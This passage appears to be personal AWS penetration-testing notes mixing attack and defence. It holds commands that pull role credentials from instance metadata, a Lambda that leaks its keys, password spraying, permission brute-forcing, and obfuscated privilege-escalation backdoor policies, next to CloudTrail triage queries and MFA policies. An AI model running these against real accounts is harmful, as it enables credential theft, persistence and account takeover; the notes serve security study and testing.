curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```

# Update the console access password for a user

```python
# update the password for the current user with profile
aws iam update-login-profile --user-name security --password <password>
```

# Get a console session from cmdline

```python
# create console session - If you don't specify a policy, the federated user will inherit the permissions of the IAM user/role used to call the get-federation-token command, but limited by the AWS STS service's scope.
aws sts get-federation-token --name ConsoleSession --policy file://policy.json --duration-seconds 3600

aws sts get-federation-token --name YourSessionName --profile your_profile | jq -r '.Credentials | "https://signin.aws.amazon.com/federation?Action=getSigninToken&Session=" + ({"sessionId": .AccessKeyId, "sessionKey": .SecretAccessKey, "sessionToken": .SessionToken} | @uri) + "&https://console.aws.amazon.com"'

# The key differences between get-session-token and get-federation-token are:

# get-session-token is often allowed when get-federation-token is restricted
# get-session-token doesn't allow you to specify a policy directly in the call
# get-session-token is primarily designed for MFA enforcement rather than federation

# It's worth trying if you're facing permission issues with the other approach.
```

# MFA session token

```python
aws sts get-session-token --duration-seconds 3600 --serial-number arn:aws:iam::123456789012:mfa/user --token-code 123456
```

# Enumeration Tools

### Pacu

```python
#brute forcing IAM permissions
pacu
set_keys
run iam__bruteforce_permissions

# enum users using pacu
set_keys
run iam__enum_users --role-name <Role_Name> --account-id <account_id>

# Identify Dangerous IAM Permissions with Pacu
run iam__enum_action_query --query iam:*

```

Pacu modules for role chaining - need to test this ones if they work!

Pacu Modules for Role Chaining:

- iam__enum_assumable_roles
    - Lists all roles the current principal can assume.
    - Uses simulation API under the hood.
    - Also supports cross-account simulations.
- iam__privesc_scan
    - Shows escalation paths, including role assumption, policy abuse, resource policies, etc
    - Highlights paths to AdministratorAccess
- sts__enum_roles
    - Brute-forces AssumeRole across known account IDs using common role names like:
        - OrganizationAccountAccessRole
        - Administrator
        - PowerUserAccess
        - Audit

## dnsap

```bash
# downloads public snapshots

```

## aws_list_all

https://github.com/JohannesEbke/aws_list_all

```bash
# List all resources in an AWS account, all regions, all services(*). Writes JSON files for further processing.
aws_list_all query --parallel 500 --verbose
```

## Aws enumerator

```python
# set creds
aws-enumerator cred -aws_access_key_id <access_key> -aws_region us-west-2 aws_secret_access_key <secret_access_key> --profile <profile>

# dump all services
aws-enumerator enum --services all

# dump ec2 or any other service like rds
aws-enumerator dump ec2 --profile <profile>

# grep just the services in use with aws-enumerator
aws-enumerator enum -services all | grep -v -E "0 / \d\d?”
```

## Cloudfox

```python
# get the secrets and ssm enum
cloudfox aws -p <profile> secrets

# buckets
cloudfox aws -p <profile> buckets

# lambda
cloudfox aws -p <profile> lambda

# evn files 
cloudfox aws -p <profile> env-vars

# check all services
cloudfox aws -p <profile> all-checks

```

## Prowler

```python
# default command
prowler aws --profile <profile> --list-compliances --no-banner

#extract the specific compliance 
prowler aws --profile <profile> --compliance cis_1.4_aws --region us-west-2 --no-banner --security-hub
```

### Prowler bash script to enum multiple accounts

```bash
#!/usr/bin/env bash

declare -A ACCOUNT_ROLES=(
  [582194756321]=prowler_role
  [194837502619]=security_audit_role
  [763209184574]=monitoring_role
)

PARALLEL_ACCOUNTS=3

for accountId in "${!ACCOUNT_ROLES[@]}"; do
  # Wait if we already have PARALLEL_ACCOUNTS jobs running
  if (( $(jobs | wc -l) >= PARALLEL_ACCOUNTS )); then
    wait
  fi

  {
    prowler aws --role "arn:aws:iam::${accountId}:role/${ACCOUNT_ROLES[$accountId]}"
  } &

done

# Ensure all background jobs finish before exiting
wait
```

## AWeSomeUserFinder

https://github.com/dievus/AWeSomeUserFinder

```powershell
# need to add some functionality for this tool/test usage to get access

```

## S3 Account Search

```powershell
# identify the AWS account ID from a public S3 bucket
s3-account-search arn:aws:iam::549936768638:role/AccountIDFromS3 huge-logistics-webassets

# get the account id from a public bucket
s3-account-search arn:aws:iam::123456789012:role/s3_read s3://my-bucket

# with an object
s3-account-search arn:aws:iam::123456789012:role/s3_read s3://my-bucket/path/to/object.ext

```

## GoAWSConsoleSpray - Password Spraying

```powershell
# use this for password spraying with a usernam and password list
./GoAWSConsoleSpray -a 741448947753 -u users.txt -p password.txt
```

## git-secrets

```bash
# check for secrets
git-secrets --register-aws 

# scan for secrets
git secrets --scan

# if the above does not return anything add -history
git secrets --scan-history
```

## OIDC checker GitHub

https://github.com/Rezonate-io/github-oidc-checker/

```bash
# run this with the set creds for the specific profile 
python3 aws-oidc-tester.py
```

## trufflehog

```bash
# git clone the repo locally first
trufflehog --regex --entropy=False <git_repo>/

# alternative command
trufflehog git file://cargo-logistics-dev/ --regex --no-entropy

# scan the actual url repo instead of downloading locally
trufflehog https://github.com/huge-logistics/cargo-logistics-dev --max_depth 2
```

# jq for cloudtrail events

```python
cat 343520694729_CloudTrail_us-west-2_20250329T1335Z_NLDEDP5D4tWO3znQ.json | jq -r '.Records[].userIdentity | select(.type=="IAMUser") | {username: (.arn | split("/") | last), arn: .arn}' | sort -u

# simple commands
 cat '702600305163_CloudTrail_us-east-1_20250327T1215Z_DXJTMSMd3k0W3Wgg.json' | jq -r '.Records[].userIdentity.accesskeyID' | sort -u

cat 702600305163_CloudTrail_us-east-1_20250327T1215Z_DXJTMSMd3k0W3Wgg.json | jq '.Records[] | select(.eventSource == "iam.amazonaws.com") | {time: .eventTime, action: .eventName, user: .userIdentity.userName, principal: .userIdentity.principalId}'

cat '702600305163_CloudTrail_us-east-1_20250327T1215Z_DXJTMSMd3k0W3Wgg.json' | jq '.Records[] | select(.eventSource == "iam.amazonaws.com") | {time: .eventTime, action: .eventName, user: .userIdentity.userName, principal: .userIdentity.principalId}'

cat '702600305163_CloudTrail_us-east-1_20250327T1215Z_DXJTMSMd3k0W3Wgg.json' | jq -r '.Records[] | select(.EventName)'

cat 343520694729_CloudTrail_us-west-2_20250329T1335Z_NLDEDP5D4tWO3znQ.json | jq -r '.Records[] | select(.userName != null) | {username: .userName, arn: .userIdentity.arn}'

cat 343520694729_CloudTrail_us-west-2_20250329T1335Z_NLDEDP5D4tWO3znQ.json | jq -r '.Records[].userName}'

cat 343520694729_CloudTrail_us-west-2_20250329T1335Z_NLDEDP5D4tWO3znQ.json | jq '.Records[0]'

# get the username and the arn for each user
cat 343520694729_CloudTrail_us-west-2_20250329T1335Z_NLDEDP5D4tWO3znQ.json | jq -r '.Records[] | select(.userIdentity.type=="IAMUser") | {username: (.userIdentity.arn | split("/") | last), arn: .userIdentity.arn}'
```

### jq cloudtrail quick triage

```python
# View basic structure of a CloudTrail log file
cat cloudtrail-log.json | jq '.'

# List all event names
cat cloudtrail-log.json | jq -r '.Records[].eventName'

# Count unique events by type
cat cloudtrail-log.json | jq -r '.Records[].eventName' | sort | uniq -c | sort -nr

# get a specific event and count it
cat cloudtrail-log.json | jq -r '.Records[].eventName' | grep -e GetBucketAcl | sort | uniq -c | sort -nr

# list all events
cat *.json | jq -r '.Records[] | select(.userIdentity.type!="Root") | .eventName' | sort | uniq -c | sort -nr

# Extract IAM user activities
cat cloudtrail-log.json | jq -r '.Records[] | select(.userIdentity.type=="IAMUser") | {user: (.userIdentity.arn | split("/") | last), event: .eventName, time: .eventTime}'

# Extract root account actions (potential security concern)
cat cloudtrail-log.json | jq -r '.Records[] | select(.userIdentity.type=="Root") | {event: .eventName, time: .eventTime}'

# Find API calls from specific IP addresses
cat cloudtrail-log.json | jq -r '.Records[] | select(.sourceIPAddress=="192.0.2.1") | {user: .userIdentity.arn, event: .eventName, time: .eventTime}'

# Find activities on critical services (S3, IAM, EC2, etc.)
cat cloudtrail-log.json | jq -r '.Records[] | select(.eventSource=="s3.amazonaws.com") | {user: .userIdentity.arn, event: .eventName, time: .eventTime}'

# Find console logins
cat cloudtrail-log.json | jq -r '.Records[] | select(.eventName=="ConsoleLogin") | {user: .userIdentity.arn, result: .responseElements.ConsoleLogin, time: .eventTime}'

# Extract failed API calls
cat cloudtrail-log.json | jq -r '.Records[] | select(.errorCode != null) | {user: .userIdentity.arn, event: .eventName, error: .errorCode, time: .eventTime}'

# Show permission changes
cat cloudtrail-log.json | jq -r '.Records[] | select(.eventName | contains("Create") or contains("Update") or contains("Put") or contains("Attach")) | select(.eventSource=="iam.amazonaws.com") | {user: .userIdentity.arn, event: .eventName, time: .eventTime}'

# Extract role assumptions
cat cloudtrail-log.json | jq -r '.Records[] | select(.eventName=="AssumeRole") | {user: .userIdentity.arn, role: .requestParameters.roleArn, time: .eventTime}'

# List resource modifications (potentially destructive actions)
cat cloudtrail-log.json | jq -r '.Records[] | select(.eventName | startswith("Delete") or startswith("Terminate") or startswith("Remove")) | {user: .userIdentity.arn, event: .eventName, resource: .resources[0].ARN, time: .eventTime}'

# Extract unusual user agents (potential scripted attacks or tools)
cat cloudtrail-log.json | jq -r '.Records[] | select(.userAgent | contains("aws-cli") | not) | select(.userAgent | contains("console.amazonaws.com") | not) | {user: .userIdentity.arn, event: .eventName, userAgent: .userAgent, time: .eventTime}'

# Create a timeline of actions by a specific user
cat cloudtrail-log.json | jq -r '.Records[] | select(.userIdentity.arn | contains("john")) | {time: .eventTime, event: .eventName}'

# Find access from outside AWS (non-AWS IP addresses)
cat cloudtrail-log.json | jq -r '.Records[] | select(.sourceIPAddress | endswith("amazonaws.com") | not) | select(.sourceIPAddress | endswith("cloudfront.net") | not) | {user: .userIdentity.arn, ip: .sourceIPAddress, event: .eventName, time: .eventTime}'

#cleaner output
cat cloudtrail-log.json | jq -r '.Records[] | select(.userIdentity.type=="IAMUser") | {user: (.userIdentity.arn | split("/") | last), event: .eventName, time: .eventTime}' | jq -s 'group_by(.user, .event) | map(.[0]) | sort_by(.user, .event)'

# check for users with admin
cat .json | jq -r '.Records[] | select(.userIdentity.type="admin*") | .userIdentity.arn' | sort | uniq -c | sort -nr

# another one for checking admin in the username 
cat *.json | jq -r '.Records[] | select(.userIdentity.arn != null) | select(.userIdentity.arn | tostring | contains("admin")) | .userIdentity.arn' | sort | uniq -c | sort -nr

# get an overview of the services 
cat *.json | jq -r '.Records[] | select(.userIdentity.arn == null) | {eventName: .eventName, eventSource: .eventSource, userIdentity: .userIdentity}'

# extract the services arn
cat *.json | jq -r '.Records[] | select(.userIdentity.arn == null) | {eventName: .eventName, eventSource: .eventSource, invokedBy: .userIdentity.invokedBy, type: .userIdentity.type}'

# summarized amazon service AWS service invoked the action, showing you all unique event types for each service.
cat *.json | jq -r '.Records[] | select(.userIdentity.type=="AWSService") | {service: .userIdentity.invokedBy, event: .eventName, source: .eventSource}' | jq -s 'group_by(.service) | map({service: .[0].service, events: map(.event) | unique})'

# list actions and services for a user
cat *.json | jq -r '.Records[] | select(.userIdentity.userName=="cloud-ops-intern") | {time: .eventTime, service: .eventSource, action: .eventName, region: .awsRegion}'

```

### Multiple files at once

```python
# Process multiple files
find . -name "*.json" -exec jq -r '.Records[] | select(.eventName=="ConsoleLogin")' {} \;

# Process gzipped files without extracting
find . -name "*.json.gz" -exec sh -c 'gunzip -c "$1" | jq -r ".Records[] | select(.eventName==\"ConsoleLogin\")"' sh {} \;
```

---

---

---

# Scripts

## Lambda function with access to role, overwriting an existing one

```python
import boto3
import json
def lambda_handler(event, context):
    credentials = boto3.Session().get_credentials()
    return {
        "statusCode": 200,
        "body": json.dumps({
            "AccessKeyId": credentials.access_key,
            "SecretAccessKey": credentials.secret_key,
            "SessionToken": credentials.token
        })
    }
# zip the above created .py file    
zip lambda_function.zip lambda_function.py

# upload the lambda function
aws lambda update-function-code --function-name automation_test --zip-file fileb://lambda_function.zip

# retrieve the function
aws lambda invoke --function-name automation_test output.json
```

## Bash Enumerate Users

```bash
#!/bin/bash

MATCH_FOUND=0
 
# export SECRET_ACCESS_KEY="key" #

# Make sure the secret key is provided
if [ -z "$SECRET_ACCESS_KEY" ]; then
    echo "Error: SECRET_ACCESS_KEY environment variable must be set"
    exit 1
fi

# List all users and process each one
aws iam list-users --query 'Users[*].UserName' --output text --profile pen | tr '\t' '\n' | while read -r user; do
    # Check for valid username format
    [[ "$user" =~ ^[a-zA-Z0-9+=,.@_-]+$ ]] || continue
    
    # For each user, list their access keys
    aws iam list-access-keys --user-name "$user" --query 'AccessKeyMetadata[*].AccessKeyId' --output text --profile pen | while read -r key_id; do
        # Configure a temporary profile with the key ID and secret to test
        aws configure set aws_access_key_id "$key_id" --profile temp-test
        aws configure set aws_secret_access_key "$SECRET_ACCESS_KEY" --profile temp-test
        
        # Test if the credentials work
        if aws sts get-caller-identity --profile temp-test >/dev/null 2>&1; then
            echo "The secret access key belongs to user: $user with Access Key ID: $key_id"
            MATCH_FOUND=1
            break 2
        fi
    done
done

# Note: Due to subshell behavior, this will not work as expected
# The MATCH_FOUND variable won't retain its value outside the while loop
if [ "$MATCH_FOUND" -eq 0 ]; then
    echo "No match found for the provided secret access key."
fi
```

same scope different setup

```bash
#!/bin/bash

# Ensure the SECRET_ACCESS_KEY variable is set
if [ -z "$SECRET_ACCESS_KEY" ]; then
    echo "Error: SECRET_ACCESS_KEY environment variable must be set"
    exit 1
fi

# Create a file to store results
result_file=$(mktemp)
echo "No match found for the provided secret access key." > "$result_file"

# Get all users
users=$(aws iam list-users --query 'Users[*].UserName' --output text --profile pen)

# Loop through each user
for user in $users; do
    # Get all access keys for this user
    access_keys=$(aws iam list-access-keys --user-name "$user" --query 'AccessKeyMetadata[*].AccessKeyId' --output text --profile pen)
    
    # Test each access key
    for key_id in $access_keys; do
        # Configure temporary profile for testing
        aws configure set aws_access_key_id "$key_id" --profile temp-test
        aws configure set aws_secret_access_key "$SECRET_ACCESS_KEY" --profile temp-test
        
        # Test if these credentials work
        if aws sts get-caller-identity --profile temp-test >/dev/null 2>&1; then
            echo "The secret access key belongs to user: $user with Access Key ID: $key_id" > "$result_file"
            # Clean up the temp profile
            aws configure set aws_access_key_id "" --profile temp-test
            aws configure set aws_secret_access_key "" --profile temp-test
            break 2 # Exit both loops
        fi
        
        # Clean up the temp profile even if unsuccessful
        aws configure set aws_access_key_id "" --profile temp-test
        aws configure set aws_secret_access_key "" --profile temp-test
    done
done

# Output the result
cat "$result_file"
rm "$result_file"
```

## Identify valid AWS access key pairs

```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

# ----------------------------------------
# Configuration
# ----------------------------------------
# The secret key to search for
SECRET_ACCESS_KEY="secretkey"

# Flag to indicate a successful match
MATCH_FOUND=0

# ----------------------------------------
# Main logic
# ----------------------------------------
echo "🔍 Searching for the owner of the secret access key..."

# Iterate over all IAM users
aws iam list-users \
    --query 'Users[*].UserName' \
    --output text | tr '\t' '\n' | while read -r user; do

  # Skip usernames with invalid characters
  if [[ ! "$user" =~ ^[a-zA-Z0-9+=,.@_-]+$ ]]; then
    continue
  fi

  # For each user, iterate over their access keys
  aws iam list-access-keys \
      --user-name "$user" \
      --query 'AccessKeyMetadata[*].AccessKeyId' \
      --output text | tr '\t' '\n' | while read -r key_id; do

    # Configure a temporary AWS CLI profile
    aws configure set aws_access_key_id     "$key_id"           --profile temp-test
    aws configure set aws_secret_access_key "$SECRET_ACCESS_KEY" --profile temp-test

    # Test whether the credentials work
    if aws sts get-caller-identity --profile temp-test >/dev/null 2>&1; then
      echo "✅ Match found!"
      echo "   User:          $user"
      echo "   AccessKeyId:   $key_id"
      MATCH_FOUND=1
      break 2
    fi

  done
done

# If we exit the loops without finding a match
if [[ "$MATCH_FOUND" -eq 0 ]]; then
  echo "❌ No match found for the provided secret access key."
fi

```

## Groovy script for jenkins for instance metadata

```bash
def command = "curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\""
def shell = "/bin/bash"
def process = ["$shell", "-c", command].execute()
process.waitFor()

if(process.exitValue() == 0) {
    def token = process.text.trim()
    println "Token obtained successfully: $token"
    
    // Now you can use this token for subsequent metadata requests
    def instanceIdCommand = ["$shell", "-c", "curl -H \"X-aws-ec2-metadata-token: $token\" http://169.254.169.254/latest/meta-data/iam/security-credentials/Jenkins_Role"].execute()
    instanceIdCommand.waitFor()
    if(instanceIdCommand.exitValue() == 0) {
        println "Instance ID: ${instanceIdCommand.text.trim()}"
    }
} else {
    println "Error fetching token: ${process.err.text}"
}
```

## Get the IMDS v2 from jupyter notebook

```bash
import os; os.system("TOKEN=$(curl -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token); echo $TOKEN")

import os; os.system("curl -H \"X-aws-ec2-metadata-token: AQAEA...\" http://169.254.169.254/latest/meta-data/iam/info/")

import os; os.system("curl -H \"X-aws-ec2-metadata-token: AQAEA...\" http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-jupyter-cluster-nodegroup-NodeInstanceRole-... ")
```

---

---

---

# General notes and findings

Yes, enforcing MFA for API access is an excellent security practice, especially for limiting the potential damage from compromised credentials or unauthorized assume-role actions. This is often called "MFA-protected API access."

### How to Enforce MFA for API Access

The primary method is through IAM policies with the `aws:MultiFactorAuthPresent` condition key. Here's how to implement it:

1. **Via IAM Policies**: Add a condition to IAM policies that requires MFA for sensitive actions:

```python
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "sts:AssumeRole",
      "Resource": "*",
      "Condition": {
        "Bool": {
          "aws:MultiFactorAuthPresent": "true"
        }
      }
    }
  ]
}
```

**Via SCP (Service Control Policies)**: For organizations using AWS Organizations, you can apply organization-wide controls:

```python
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RequireMFAForCriticalActions",
      "Effect": "Deny",
      "Action": [
        "s3:*",
        "ec2:*",
        "iam:*"
        // other sensitive services
      ],
      "Resource": "*",
      "Condition": {
        "BoolIfExists": {
          "aws:MultiFactorAuthPresent": "false"
        }
      }
    }
  ]
}
```

### Best Practices for Implementation

1. **Initial Access Flow**:
    - Users authenticate with long-term credentials
    - They call `sts:GetSessionToken` with MFA
    - They use the temporary credentials for all subsequent operations
2. **Role-based Access**:
    - Require MFA for `sts:AssumeRole` operations
    - Make sensitive roles only assumable with MFA-authenticated sessions
3. **Emergency Access**:
    - Implement break-glass procedures for emergencies when MFA might not be available
    - These should be heavily audited and limited

### Security Benefits

This approach provides multiple security advantages:

- Even if access keys are compromised, attackers can't perform critical operations without the MFA device
- It creates a strong barrier against privilege escalation attempts
- It leaves clear audit trails of authenticated access
- It forces attackers to obtain both credentials and physical MFA tokens for serious attacks
1. **Basic Account Access**:
    - User has an IAM user with limited permissions
    - User has long-term access keys for initial API authentication
2. **MFA-Enforced Assume Role**:
    - User calls `sts:GetSessionToken` with their MFA device
    - This generates temporary credentials that are MFA-authenticated
3. **Privileged Operations**:
    - User uses these temporary credentials to assume roles with elevated permissions
    - IAM policies on those roles verify the presence of MFA authentication
    - User performs necessary tasks with the elevated permissions
4. **Session Expiration**:
    - Temporary credentials expire (typically after 1-12 hours)
    - Role session also expires (typically after 1 hour)
5. **Repeat When Needed**:
    - User must re-authenticate with MFA when they need elevated access again

## Obfuscating policies

```bash
# obfuscated version of a policy
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "\u0041llow",
      "A\u0063tion": [
        "\u0069\u0061m:C?\u0065atePoli\u0063y",
        "\u0069\u0061m:A?\u0074achUserP*licy",
        "iam:A?\u0074achR?lePolicy",
        "\u0069\u0061m:P*\u0074RolePolicy",
        "\u0069\u0061m:P*ssRole",
        "\u0069\u0061m:C?\u0065ateRole",
        "\u0069\u0061m:Upda??As\u0073umeRolePolicy",
        "ec2:R??Insta\u006eces",
        "\u0065\u0063\u0032:A?\u0073ociateIamInstancePr?file"
      ],
      "Resource": "\u002a"
    }
  ]
}

# Deobfuscated version from above
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "iam:CreatePolicy",
        "iam:AttachUserP*licy",
        "iam:AttachR?lePolicy",
        "iam:PutRolePolicy",
        "iam:PassRole",
        "iam:CreateRole",
        "iam:Upda??AssumeRolePolicy",
        "ec2:RunInstances",
        "ec2:AssociateIamInstancePr?file"
      ],
      "Resource": "*"
    }
  ]
}

```

### cloud formation yaml abuse obfuscated policy

```bash
AWSTemplateFormatVersion: "2010-09-09"
Description: "CloudFormation stack with obfuscated IAM policy abuse"

Resources:
  BackdoorPolicy:
    Type: "AWS::IAM::Policy"
    Properties:
      PolicyName: "ObfuscatedPrivilegeEscalation"
      Roles: 
        - !Ref TargetIAMRole
      PolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: "\u0041llow"
            A\u0063tion:
              - "\u0069\u0061m:C?\u0065atePoli\u0063y"
              - "\u0069\u0061m:A?\u0074achUserP*licy"
              - "iam:A?\u0074achR?lePolicy"
              - "\u0069\u0061m:P*\u0074RolePolicy"
              - "\u0069\u0061m:P*ssRole"
              - "\u0069\u0061m:C?\u0065ateRole"
              - "\u0069\u0061m:Upda??As\u0073umeRolePolicy"
              - "ec2:R??Insta\u006eces"
              - "\u0065\u0063\u0032:A?\u0073ociateIamInstancePr?file"
            Resource: "\u002a"

  TargetIAMRole:
    Type: "AWS::IAM::Role"
    Properties:
      RoleName: "TrustedEC2BackdoorRole"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service: "ec2.amazonaws.com"
            Action: "sts:AssumeRole"

```

### abuse lambda function

```bash
aws lambda update-function-configuration \
  --function-name backdoorFn \
  --role arn:aws:iam::<target-acct>:role/backdoorRole \
  --environment "Variables={IAM_POLICY='{
    \"Version\": \"2012-10-17\",
    \"Statement\": [{
      \"Effect\": \"\\u0041llow\",
      \"A\\u0063tion\": [
        \"\\u0069\\u0061m:C?\\u0065atePoli\\u0063y\",
        \"\\u0069\\u0061m:A?\\u0074achUserP*licy\",
        \"iam:A?\\u0074achR?lePolicy\",
        \"\\u0069\\u0061m:P*\\u0074RolePolicy\",
        \"\\u0069\\u0061m:P*ssRole\",
        \"\\u0069\\u0061m:C?\\u0065ateRole\",
        \"\\u0069\\u0061m:Upda??As\\u0073umeRolePolicy\",
        \"ec2:R??Insta\\u006eces\",
        \"\\u0065\\u0063\\u0032:A?\\u0073ociateIamInstancePr?file\"
      ],
      \"Resource\": \"\\u002a\"
    }]
  }'"

```

If the Lambda function is running under a **privileged role** (e.g., `iam:CreatePolicy`, `iam:PutRolePolicy`, `iam:PassRole`), **then the policy becomes weaponizable.** In that case, the Lambda could:

- Programmatically call `PutRolePolicy` or `AttachUserPolicy` using the **obfuscated JSON**
- Assume roles (`sts:AssumeRole`) to elevate context
- Deploy resources with elevated access (e.g., new roles, EC2 with IAM profile, etc.)

🧠 Example: Lambda Executes Obfuscated Priv-Esc Logic

```bash
import boto3, json
iam = boto3.client('iam')

obfuscated_policy = {
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "\u0041llow",
        "A\u0063tion": [
            "\u0069\u0061m:C?\u0065atePoli\u0063y",
            "\u0069\u0061m:P*ssRole"
        ],
        "Resource": "\u002a"
    }]
}

# Deploy the obfuscated policy to an existing role
iam.put_role_policy(
    RoleName='targetRole',
    PolicyName='sneakyPolicy',
    PolicyDocument=json.dumps(obfuscated_policy)
)

```